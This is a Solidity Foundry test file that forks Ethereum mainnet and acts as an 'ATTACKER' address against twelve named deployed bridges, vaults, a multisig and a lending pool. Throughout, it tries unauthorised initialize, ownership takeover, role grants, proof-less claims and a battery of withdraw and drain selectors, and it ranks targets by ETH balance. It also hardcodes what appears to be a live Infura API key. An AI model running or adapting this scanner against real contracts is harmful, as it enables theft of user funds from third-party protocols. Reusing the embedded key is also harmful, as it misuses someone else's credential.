// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title SystematicAccessControlProbe
 * @notice Systematically probes contracts for access control vulnerabilities
 * @dev Tests for: uninitialized proxies, permissionless withdraws, missing auth checks
 */
contract SystematicAccessControlProbe is Test {
    string constant RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";

    address constant ATTACKER = address(0xBAD);

    // High-value contracts from contracts.txt to probe
    address[] public contractsToProbe = [
        0x36f513fE52123Addb4d004348A0801Dc443BbB31, // RedeemOperator
        0x312e67b47a2A29AE200184949093D92369f80B53, // BridgeVault
        0xc94c4ec62a59fcF4964873CC6529559cc7717388, // Bridge
        0xfc6e18E22aD11592494B3D541ba25AF63A807527, // MultiSigWallet
        0x90d2af7d622ca3141efa4d8f1f24d86e5974cc8f, // EtherealPreDepositVault
        0xa45d7f2e3152bc5e207a13ebbf6cd92208bf4d19, // DelayedTransferVault
        0xe04bb5b4de60fa2fba69a93ade13a8b3b569d5b4, // TransmuterV2
        0xbcd7254a1d759EFA08EC7c3291B2E85c5dcc12ce, // FeeSharingSystem
        0xa62f9c5af106feee069f38de51098d9d81b90572, // StoneVault
        0x5bdd1fa233843bfc034891be8a6769e58f1e1346, // GenericStakedAppreciatingVault
        0x4dbcb0cff525b91e8b9d18b224c1b45fef008549, // ActivePool
        0x7823758064403089f2500e10b58ad75536b868af  // HelloBridge
    ];

    function setUp() public {
        vm.createSelectFork(RPC_URL);
    }

    /*//////////////////////////////////////////////////////////////
                        INITIALIZATION PROBES
    //////////////////////////////////////////////////////////////*/

    /// @notice Probe contracts for uninitialized state that could be exploited
    function test_probe_initialization_state() public {
        console.log("\n=== INITIALIZATION STATE PROBES ===\n");

        for (uint i = 0; i < contractsToProbe.length; i++) {
            address target = contractsToProbe[i];
            console.log("Probing:", target);

            // Try to read common initialization slots
            bytes32 slot0 = vm.load(target, bytes32(0));
            console.log("  Slot 0:", vm.toString(slot0));

            // EIP-1967 implementation slot
            bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
            bytes32 impl = vm.load(target, implSlot);
            if (impl != bytes32(0)) {
                console.log("  Implementation:", vm.toString(impl));

                // Check if implementation is initializable
                address implAddr = address(uint160(uint256(impl)));
                if (implAddr.code.length > 0) {
                    // Try calling initialize on implementation directly
                    vm.startPrank(ATTACKER);
                    (bool success,) = implAddr.call(abi.encodeWithSignature("initialize()"));
                    if (success) {
                        console.log("  !!! VULNERABLE: Implementation accepts initialize() !!!");
                    }

                    // Try common init functions
                    (success,) = implAddr.call(abi.encodeWithSignature("init()"));
                    if (success) {
                        console.log("  !!! VULNERABLE: Implementation accepts init() !!!");
                    }
                    vm.stopPrank();
                }
            }

            console.log("");
        }
    }

    /*//////////////////////////////////////////////////////////////
                    PERMISSIONLESS FUNCTION PROBES
    //////////////////////////////////////////////////////////////*/

    /// @notice Try calling withdrawal functions without authorization
    function test_probe_permissionless_withdrawals() public {
        console.log("\n=== PERMISSIONLESS WITHDRAWAL PROBES ===\n");

        vm.startPrank(ATTACKER);
        vm.deal(ATTACKER, 1 ether);

        bytes4[] memory withdrawSelectors = new bytes4[](10);
        withdrawSelectors[0] = bytes4(keccak256("withdraw(uint256)"));
        withdrawSelectors[1] = bytes4(keccak256("withdraw(address,uint256)"));
        withdrawSelectors[2] = bytes4(keccak256("withdrawAll()"));
        withdrawSelectors[3] = bytes4(keccak256("emergencyWithdraw()"));
        withdrawSelectors[4] = bytes4(keccak256("rescue(address,uint256)"));
        withdrawSelectors[5] = bytes4(keccak256("rescueTokens(address,uint256)"));
        withdrawSelectors[6] = bytes4(keccak256("sweep(address)"));
        withdrawSelectors[7] = bytes4(keccak256("drain()"));
        withdrawSelectors[8] = bytes4(keccak256("transferETH(address,uint256)"));
        withdrawSelectors[9] = bytes4(keccak256("transferERC20(address,address,uint256)"));

        for (uint i = 0; i < contractsToProbe.length; i++) {
            address target = contractsToProbe[i];
            uint256 targetBalance = target.balance;

            if (targetBalance > 0.01 ether) {
                console.log("High-value target:", target, "Balance:", targetBalance / 1e18, "ETH");

                for (uint j = 0; j < withdrawSelectors.length; j++) {
                    // Try with different parameter combinations
                    _tryWithdrawCall(target, withdrawSelectors[j], ATTACKER, targetBalance);
                }
            }
        }

        vm.stopPrank();
    }

    function _tryWithdrawCall(address target, bytes4 selector, address recipient, uint256 amount) internal {
        // Try with no params
        (bool success,) = target.call(abi.encodePacked(selector));
        if (success) {
            console.log("  !!! SUCCESS: selector", vm.toString(bytes32(selector)));
            return;
        }

        // Try with (uint256)
        (success,) = target.call(abi.encodeWithSelector(selector, amount));
        if (success) {
            console.log("  !!! SUCCESS: selector(uint256)", vm.toString(bytes32(selector)));
            return;
        }

        // Try with (address, uint256)
        (success,) = target.call(abi.encodeWithSelector(selector, recipient, amount));
        if (success) {
            console.log("  !!! SUCCESS: selector(address,uint256)", vm.toString(bytes32(selector)));
            return;
        }
    }

    /*//////////////////////////////////////////////////////////////
                        OWNER TAKEOVER PROBES
    //////////////////////////////////////////////////////////////*/

    /// @notice Try to become owner/admin of contracts
    function test_probe_owner_takeover() public {
        console.log("\n=== OWNER TAKEOVER PROBES ===\n");

        vm.startPrank(ATTACKER);

        for (uint i = 0; i < contractsToProbe.length; i++) {
            address target = contractsToProbe[i];
            console.log("Probing:", target);

            // Try to claim ownership
            (bool success,) = target.call(abi.encodeWithSignature("claimOwnership()"));
            if (success) {
                console.log("  !!! VULNERABLE: claimOwnership() succeeded");
            }

            // Try to become pending owner and accept
            (success,) = target.call(abi.encodeWithSignature("acceptOwnership()"));
            if (success) {
                console.log("  !!! VULNERABLE: acceptOwnership() succeeded without pending");
            }

            // Check for open initialization
            (success,) = target.call(abi.encodeWithSignature("initialize(address)", ATTACKER));
            if (success) {
                console.log("  !!! VULNERABLE: initialize(address) succeeded");
            }

            // Try setting owner directly
            (success,) = target.call(abi.encodeWithSignature("setOwner(address)", ATTACKER));
            if (success) {
                console.log("  !!! VULNERABLE: setOwner() succeeded");
            }

            // Try becoming admin
            (success,) = target.call(abi.encodeWithSignature("grantRole(bytes32,address)", bytes32(0), ATTACKER));
            if (success) {
                console.log("  !!! VULNERABLE: grantRole(DEFAULT_ADMIN) succeeded");
            }
        }

        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                        SPECIFIC CONTRACT PROBES
    //////////////////////////////////////////////////////////////*/

    /// @notice Deep probe of BridgeVault
    function test_probe_bridgeVault_deep() public {
        address bridgeVault = 0x312e67b47a2A29AE200184949093D92369f80B53;

        console.log("\n=== BRIDGEVAULT DEEP PROBE ===\n");
        console.log("ETH Balance:", bridgeVault.balance);

        // Check owner
        (bool success, bytes memory data) = bridgeVault.staticcall(abi.encodeWithSignature("owner()"));
        if (success && data.length >= 32) {
            address owner = abi.decode(data, (address));
            console.log("Owner:", owner);

            // Check if owner is a contract we might be able to manipulate
            if (owner.code.length > 0) {
                console.log("Owner is a contract - checking for vulnerabilities");

                // Check owner's owner
                (success, data) = owner.staticcall(abi.encodeWithSignature("owner()"));
                if (success && data.length >= 32) {
                    address ownerOwner = abi.decode(data, (address));
                    console.log("Owner's owner:", ownerOwner);
                }
            }
        }
    }

    /// @notice Probe DelayedTransferVault for timing vulnerabilities
    function test_probe_delayedVault() public {
        address delayedVault = 0xa45d7f2e3152bc5e207a13ebbf6cd92208bf4d19;

        console.log("\n=== DELAYED TRANSFER VAULT PROBE ===\n");

        uint256 balance = delayedVault.balance;
        console.log("ETH Balance:", balance);

        // Check WETH balance
        address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        (bool success, bytes memory data) = WETH.staticcall(
            abi.encodeWithSignature("balanceOf(address)", delayedVault)
        );
        if (success) {
            uint256 wethBalance = abi.decode(data, (uint256));
            console.log("WETH Balance:", wethBalance / 1e18);
        }

        // Try to read delay parameters
        (success, data) = delayedVault.staticcall(abi.encodeWithSignature("delay()"));
        if (success && data.length >= 32) {
            uint256 delay = abi.decode(data, (uint256));
            console.log("Delay:", delay, "seconds");
        }

        // Check if there are pending transfers we can claim
        vm.startPrank(ATTACKER);
        (success,) = delayedVault.call(abi.encodeWithSignature("claim()"));
        if (success) {
            console.log("!!! claim() succeeded - check for fund drain");
        }
        vm.stopPrank();
    }

    /// @notice Probe ActivePool (Liquity-style)
    function test_probe_activePool() public {
        address activePool = 0x4dbcb0cff525b91e8b9d18b224c1b45fef008549;

        console.log("\n=== ACTIVE POOL PROBE ===\n");

        uint256 ethBalance = activePool.balance;
        console.log("ETH Balance:", ethBalance / 1e18);

        // Read collateral token if exists
        (bool success, bytes memory data) = activePool.staticcall(
            abi.encodeWithSignature("getETH()")
        );
        if (success && data.length >= 32) {
            console.log("getETH():", abi.decode(data, (uint256)) / 1e18);
        }

        // Check for authorized senders
        (success, data) = activePool.staticcall(
            abi.encodeWithSignature("borrowerOperationsAddress()")
        );
        if (success && data.length >= 32) {
            address borrowerOps = abi.decode(data, (address));
            console.log("BorrowerOperations:", borrowerOps);
        }

        // Try sending ETH directly (some pools have fallback vulnerabilities)
        vm.deal(ATTACKER, 1 ether);
        vm.startPrank(ATTACKER);

        (success,) = activePool.call{value: 0.1 ether}("");
        if (success) {
            console.log("!!! Direct ETH transfer accepted");
        }

        vm.stopPrank();
    }

    /// @notice Probe HelloBridge
    function test_probe_helloBridge() public {
        address helloBridge = 0x7823758064403089f2500e10b58ad75536b868af;

        console.log("\n=== HELLO BRIDGE PROBE ===\n");

        uint256 ethBalance = helloBridge.balance;
        console.log("ETH Balance:", ethBalance / 1e18);

        // Check for validators/relayers
        (bool success, bytes memory data) = helloBridge.staticcall(
            abi.encodeWithSignature("validator()")
        );
        if (success && data.length >= 32) {
            console.log("Validator:", abi.decode(data, (address)));
        }

        // Try executing a cross-chain message
        vm.startPrank(ATTACKER);

        // Attempt to claim without valid proof
        (success,) = helloBridge.call(
            abi.encodeWithSignature("claim(bytes32,address,uint256)", bytes32(0), ATTACKER, 1 ether)
        );
        if (success) {
            console.log("!!! claim() succeeded without proof");
        }

        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                        COMPREHENSIVE BALANCE CHECK
    //////////////////////////////////////////////////////////////*/

    function test_check_all_balances() public view {
        console.log("\n=== CONTRACT BALANCES ===\n");

        for (uint i = 0; i < contractsToProbe.length; i++) {
            address target = contractsToProbe[i];
            uint256 ethBalance = target.balance;

            if (ethBalance > 0) {
                console.log(target);
                console.log("  ETH:", ethBalance / 1e18, ".", (ethBalance % 1e18) / 1e14);
            }
        }
    }
}
